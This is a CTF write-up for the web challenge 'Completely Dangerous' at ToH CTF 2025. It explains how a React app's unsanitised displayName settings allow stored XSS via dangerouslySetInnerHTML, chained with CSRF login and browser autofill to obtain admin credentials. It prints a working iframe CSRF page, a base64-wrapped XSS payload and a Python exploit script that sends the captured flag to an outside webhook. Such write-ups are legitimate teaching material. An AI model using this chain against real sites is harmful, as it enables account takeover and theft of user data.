# Completely Dangerous<br><small style="color: #888;font-size: 20px;">writeup @ ToH CTF 2025</small>
<span style="background-color: #121212; padding: 4px; border-radius: 3px; margin-right: 2px;">Category: `web`</span> <span style="background-color: #121212; padding: 4px; border-radius: 3px; margin-right: 2px;">Author: [`Ricy`](https://github.com/riccardosarro)</span> <span style="background-color: #121212; padding: 4px; border-radius: 3px;">Solves: `2`</span>

> I am developing this app with a beautiful feature that allows users to color and choose their name and color. But... I believe something is not right.

<hr/>

## Index
1. [TL;DR](#tldr)
2. [Source code](#source-code)
3. [Exploitation](#exploitation)
4. [Exploit script](#exploit-script)

<hr/>
<span id="tldr"></span>

### 1. `TL;DR`
The challenge is vulnerable to **CSRF** and stored Cross-Site Scripting (**stored XSS**) attacks, due to the way the app handles user settings. Furthermore, the bot has their credentials saved in a custom firefox profile, which has **user preferences for autofilling forms** set to true, that can be used to **autocomplete** the login form and access the admin dashboard, where the flag is.

<span id="source-code"></span>

## 2. Source code
The bot uses a custom firefox profile, where we find in `bot/firefox_profile/logins.json` the credentials saved. We can't see the credentials directly because they are encrypted. But we can either use the `key4.db` file or starting a firefox instance with the profile to see the credentials, which in this case are `admin` and `testpaswd`. Credentials in the remote server are different, so we can use those just to test locally.

In React and many other frameworks, when you render a string directly with the `children` key or the `{}` syntax, it is automatically escaped to prevent XSS. However, you can use a special key called `dangerouslySetInnerHTML` to render HTML directly, which is not escaped and can lead to XSS if not handled properly.

The app is vulnerable to XSS due to the way it handles user settings, the `displayName` field in particular. The `displayName` is rendered directly (all its keys) in the dashboard without sanitization.

```tsx
// app/dashboard/page.tsx
...
69: <p>Username: <span>{user.username}</span></p>
70: {userSettings?.displayName && (
71:   <p>Display Name: <span {...userSettings.displayName}></span></p>
72: )}
...
```

Since the `displayName` when updated is not sanitized, and saved as JSON, it can contain any key and value. So it is actually possible to inject another key other than the `children` and `style` desired by the app. Indeed we can see that the `displayName` is saved to the db without any sanitization:
```tsx
// app/api/userSettings/route.ts
...
export async function POST(request: NextRequest) {
  ...
    const { displayName } = await request.json();

    const db = getDatabase();
    const success = await db.updateUserSettings(user.id, {
      displayName
    });
...
```
```ts
// lib/database.ts
...
  async updateUserSettings(userId: number, settings?: UserSettings): Promise<boolean> {
    try {
      const finalSettings = settings || EMPTY_USER_SETTINGS;
      
      await this.run(`
        INSERT OR REPLACE INTO user_settings 
        (user_id, display_name)
        VALUES (?, ?)
      `, [
        userId,
        JSON.stringify(finalSettings.displayName || EMPTY_USER_SETTINGS.displayName)
      ]);
      return true;
    } catch (error) {
      console.error('Error updating user settings:', error);
      return false;
    }
  }
...
```

<span id="exploitation"></span>

## 3. Exploitation

To exploit this vulnerability we can craft a UserSettings with the key `dangerouslySetInnerHTML` with a value of `{"__html": "payloadxss"}` into the `displayName` field with a POST to `/api/settings`, while we're logged in. This will store the xss payload to the logged user and execute the script when the dashboard of that user is loaded.

We now need to have the bot visit our page with the XSS payload. The bot though is already logged in, and we need the bot to have a session with the user that has the XSS payload we injected. Note that we can make the bot visit any website, given its protocol is `http` or `https`.

Since there is no **CSRF** protection in the app, if the bot visit our malicious page, we can make it send requests to handle his user session, like logging in with another user.

We can use an `<iframe>` to make sure the bot does not have any session active and make it login with the user we want. The bot then will trigger the XSS inside the iframe.

Indeed, we can host a simple HTML page that automatically logins as our wanted user, and then visits the dashboard page with the XSS payload.
```html
<!-- xss.html -->
<iframe id="x-frame" src="{{ app_url }}/"></iframe>
<script>
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  x = async () => {
    // await sleep(1000);
    xframe = document.getElementById("x-frame");
    xframe.contentWindow.fetch("{{ app_url }}/api/login", {
      method: "POST",
      mode: "no-cors",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        username: "{{ username }}",
        password: "{{ password }}",
      }),
    });
    await sleep(1000);
    xframe.src = "{{ app_url }}/dashboard";
    // xss should trigger now
  };
  x();
</script>
```

Now we just need the right xss payload to retrieve the flag. 

The flag is stored in the userSettings of the admin, as shown in the `bot.js` file. We don't have the credentials to log in as admin, but we don't need that since the browser has the autofill form enabled.

```js
// bot.js
...

// Launch Firefox with custom profile using persistent context
context = await firefox.launchPersistentContext(tempProfilePath, {
  headless: true,
  ignoreHTTPSErrors: true,
  acceptDownloads: false,
  firefoxUserPrefs: {
    'signon.rememberSignons': true,
    'signon.autofillForms': true,
  }
});

...

await page.click('a:has-text("Settings")');
// Fill in settings form
await page.waitForSelector('input[name="displayName"]', { timeout: 5000 });
console.log(`[+] Filling settings form with flag: ${FLAG}`);
await page.fill('input[name="displayName"]', FLAG);

...
```

So we can open a new window to:
- **logout** the bot from the previous session (our user that triggered the XSS), 
- visit `/login` by pressing the login button (just visiting `/login` won't do the trick due to nextjs handling the re-rendering), 
- we will have already the credentials filled, so we can just **submit the form**. 
- we can read the flag from the `/dashboard` or `/settings` page. 

Note that we can directly interact with the window from the XSS only because the XSS is triggered in the same origin, thus not violating the same-origin policy. 

My final xss payload:
```html
<img onerror=document.write(atob(\"" + encode_base64(xss_payload) + "\")) src='invalid-image' />
```

where `xss_payload` is:
```html
<script>
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
(async () => {
    w = window.open('/')
    await sleep(1000);
    logoutbtn = w.document.getElementsByClassName('logout-btn')
    if (logoutbtn.length > 0) {
        // click logout button if exists
        w.document.getElementsByClassName('logout-btn')[0].click();
        await sleep(500);
    }
    // look for <a href="/login">Login</a> tag and click it
    w.document.querySelector('a[href="/login"]').click();
    // wait for autofill
    await sleep(1000);
    w.document.getElementsByClassName('btn')[0].click();
    // wait for redirect / login
    await sleep(1000);
    // extract flag from body
    const body = w.document.body.innerHTML;
    const flagMatch = body.match(/toh\\{{([^}}]+)\\}}/);
    if (flagMatch) {
        const flag = flagMatch[1];
        fetch('{webhook_url}/?flag=' + encodeURIComponent(flag), { 'mode': 'no-cors' });
    } else {
        console.error('Flag not found in body:', body);
    }
})();
</script>
```

<span id="exploit-script"></span>

## 4. Exploit script

```py
import requests
from pyngrok import ngrok
import sys

s = requests.Session()
# ignore cert errors, needed for local testing
s.verify = False

# check for LOCAL or REMOTE
local = sys.argv[1] != 'remote' if len(sys.argv) > 1 else True

bot_url = "http://localhost:5001"
if not local:
    bot_url = "https://bot.completely-dangerous.ctf.towerofhanoi.it"
app_url = "https://localhost:5000"
if not local:
    app_url = "https://completely-dangerous.ctf.towerofhanoi.it"

ngrok_tunnel = ngrok.connect(5050)
webhook_url = ngrok_tunnel.public_url

username='xssthis'
password='xssisfun'

from flask import Flask, render_template

app = Flask(__name__)

@app.route('/x', methods=['GET'])
def x():
    bot_credentials_app_url = "https://chall:5000" if local else app_url
    return render_template('x.html', username=username, password=password, app_url=bot_credentials_app_url)

import base64
from threading import Thread

def encode_base64(data):
    """Encode data to base64."""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.b64encode(data).decode('utf-8')

xss_payload = f"""<script>
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
(async () => {{
    w = window.open('/')
    await sleep(1000);
    logoutbtn = w.document.getElementsByClassName('logout-btn')
    if (logoutbtn.length > 0) {{
        // click logout button if exists
        w.document.getElementsByClassName('logout-btn')[0].click();
        await sleep(500);
    }}
    // look for <a href="/login">Login</a> tag and click it
    w.document.querySelector('a[href="/login"]').click();
    // wait for autofill
    await sleep(1000);
    w.document.getElementsByClassName('btn')[0].click();
    // wait for redirect / login
    await sleep(1000);
    // extract flag from body
    const body = w.document.body.innerHTML;
    const flagMatch = body.match(/toh\\{{([^}}]+)\\}}/);
    if (flagMatch) {{
        const flag = flagMatch[1];
        fetch('{webhook_url}/?flag=' + encodeURIComponent(flag), {{ 'mode': 'no-cors' }});
    }} else {{
        console.error('Flag not found in body:', body);
    }}
}})();
</script>
"""

def store_xss_payload():
    # assuming session has user authentication
    # Create settings with XSS payload
    payload = {
        "displayName": {
            # "children": "",
            # "style": {"color": "red"},
            "dangerouslySetInnerHTML": {
                "__html": "<img onerror=document.write(atob(\"" + encode_base64(xss_payload) + "\")) src='invalid-image' />"
            }
        }
    }
    response = s.post(f"{app_url}/api/settings", json=payload)
    if response.status_code == 200:
        print("XSS payload stored successfully.")
    else:
        print(f"Failed to store XSS payload. Status code: {response.status_code}")
        print("Response:", response.text)
    return response

def register(username, password):
    # Register a new user
    payload = {
        "username": username,
        "password": password
    }
    response = s.post(f"{app_url}/api/register", json=payload)
    if response.status_code == 201:
        print("User registered successfully.")
    else:
        print(f"Failed to register user. Status code: {response.status_code}")
        print("Response:", response.text)
    return response

def login(username, password):
    # Login the user
    payload = {
        "username": username,
        "password": password
    }
    response = s.post(f"{app_url}/api/login", json=payload)
    if response.status_code == 200:
        print("User logged in successfully.")
        print("Token:", response.cookies.get("auth-token"))
    else:
        print(f"Failed to login. Status code: {response.status_code}")
        print("Response:", response.text)
    return response

def bot_visit(url):
    # Visit the bot URL
    response = requests.post(f"{bot_url}/visit", json={"url": url})
    if response.status_code == 200:
        print(f"Bot visited {url} successfully.")
        print("Response:", response.text)
    else:
        print(f"Failed to visit {url}. Status code: {response.status_code}")
        print("Response:", response.text)
    return response


def exploit():
    global username, password

    register(username, password)
    login(username, password)
    store_xss_payload()
    bot_visit(f"{webhook_url}/x")


if __name__ == "__main__":
    print("Starting exploit...")
    Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5050}, daemon=True).start()
    exploit()
    print('Listening for flag in webhook...')
    # sleep until the flag is received
    import time
    time.sleep(100)  # wait for 100 seconds
    print('Exiting...')
```

In order to run the exploit, you need to have installed the required packages:
```bash
pip install requirements.txt
```

Then you can run the exploit with:
```bash
python exploit.py [local|remote]
```